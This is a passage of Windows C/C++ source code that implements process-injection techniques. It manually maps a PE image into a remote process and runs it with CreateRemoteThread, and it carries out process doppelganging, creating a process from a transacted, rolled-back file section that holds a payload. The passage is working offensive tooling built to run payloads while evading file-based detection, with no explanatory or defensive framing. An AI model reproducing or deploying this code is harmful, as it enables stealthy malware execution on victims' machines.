    ULONGLONG RemotePEBAddress = (ULONGLONG)pbi.PebBaseAddress;
    if (!RemotePEBAddress) {
        printf("failed getting remote PEB address Error Code 0x%x\n", GetLastError());
        return false;
    }
    PEB PEBCopy = { 0 };
    ULONGLONG offset = (ULONGLONG)&PEBCopy.ProcessParameters - (ULONGLONG)&PEBCopy;

    LPVOID RemoteImaegBase = (LPVOID)(RemotePEBAddress + offset);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, RemoteImaegBase, &ParametarBase, sizeof(PVOID), &written)) {
        printf("failed Cannot update Params Error Code 0x%x\n", GetLastError());
        return false;
    }

    return true;
}

DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter)
{
    BOOL bSuccess = FALSE;
    LPVOID lpRemoteLibraryBuffer = NULL;
    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
    HANDLE hThread = NULL;
    DWORD dwReflectiveLoaderOffset = 0;
    DWORD dwThreadId = 0;
    DWORD dwLength;

    if (!hProcess || !SourceFileData) {

        printf("invaild argument to LoadRemoteLibraryR\n");
        return -1;
    }


    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);

    dwLength = pSourceHeaders->OptionalHeader.SizeOfImage;
    lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteLibraryBuffer) {

        printf("Failed To allocate Memory in remote Process Error Code is %x\n",GetLastError());
        return -1;
    }


    DWORD64 dwDelta = (DWORD64)lpRemoteLibraryBuffer - pSourceHeaders->OptionalHeader.ImageBase;

    pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)lpRemoteLibraryBuffer;

    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
       
        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = (PVOID)((DWORD64)lpRemoteLibraryBuffer + pSourceImage->Sections[x].VirtualAddress);

        if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData, 0)) {
            printf("Failed writing process memory at address %p Error Code 0x%x\r\n", pSectionDestination, GetLastError());
            return -1;
        }
    }

    //Fixing the relocation in PE File
    if (dwDelta)
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            char pSectionName[] = ".reloc";

            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;

            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];

                dwOffset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];

                for (DWORD y = 0; y < dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (pBlocks[y].Type == 0)
                        continue;

                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

                    DWORD64 dwBuffer = 0;
                    BOOL bSuccess;
                    bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress),&dwBuffer, sizeof(DWORD64), 0);
                    if (!bSuccess) {
                        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), GetLastError());
                        return -1;
                    }

                    dwBuffer += dwDelta;
                    bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), &dwBuffer, sizeof(DWORD64), 0);

                    if (!bSuccess) {
                        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress, GetLastError()));
                        return -1;
                    }
                }
            }

            break;
        }



    //Resolve IAT API in remote Process
    //the Pe File Should depend only on kernel32 and ntdll.dll
    BYTE* RemoteDataBuffer = NULL;
    RemoteDataBuffer = new BYTE[dwLength];
    if (!RemoteDataBuffer) {
        printf("failed to allocate memory\n");
        return -1;
    }
    BOOL ret = ReadProcessMemory(hProcess, (PVOID)lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0);
    if (!ret) {
        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)RemoteDataBuffer);

    LPCSTR libraryName = "";
    HMODULE library = NULL;


    while (importDescriptor->Name != NULL)
    {

        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)RemoteDataBuffer;
        library = LoadLibraryA(libraryName);

        if (library)
        {

            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)RemoteDataBuffer + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {

                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)RemoteDataBuffer + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name); 
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }


    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0))
    {
        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    DWORD64 dwEntrypoint = (DWORD64)lpRemoteLibraryBuffer + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)dwEntrypoint, lpParameter, (DWORD)NULL, &dwThreadId);
    if (!hThread) {
        printf("failed to create remote thread Erro Code %x\n",GetLastError());
        return -1;
    }

    CloseHandle(hThread);
    
    return NULL;
}

HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize) {
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("Failed to create transaction! Error Code %x\n" ,GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create transacted file Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        printf("Failed writing payload! Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status  = fnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
    if (status != 0) {
        printf("Failed NtCreateSection  Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        printf("Failed RollbackTransaction  Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}


DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName) {

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
    _NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    _NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    HANDLE hThread = NULL;
    DWORD dwThreadId;
    DWORD param = NULL;

    HANDLE hProcess = nullptr;
    NTSTATUS status = fnNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (status != 0) {
        printf("Failed in NtCreateProcessEx Error Code 0x%x\n ", GetLastError());
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            printf("[!] Failed The payload has mismatching bitness\n ");
        }
        return -1;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
    if (status != 0) {
        printf("Failed in NtQueryInformationProcess Error Code 0x%x\n ", GetLastError());
        return -1;
    }

   
    PEBmy* PebCopy = ReadRemotePEB(hProcess);

    ULONGLONG imageBase = (ULONGLONG)PebCopy->ImageBaseAddress;
    DWORD payloadEntryPointRVA = GetEntryPointRVA(PayloadData);
    ULONGLONG procEntry = payloadEntryPointRVA + imageBase;
    

    if (SetProcessParametar(hProcess, pi, TargetProcessName) == -1) {
        printf("Failed in setuping Parameters Error Code 0x%x\n ", GetLastError());
        return -1;
    }
    
    status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        printf("Failed in NtCreateThreadEx %x  Error Code 0x%x   %x\n ", hThread,GetLastError(), status);
        return -1;
    }

    return 0;
}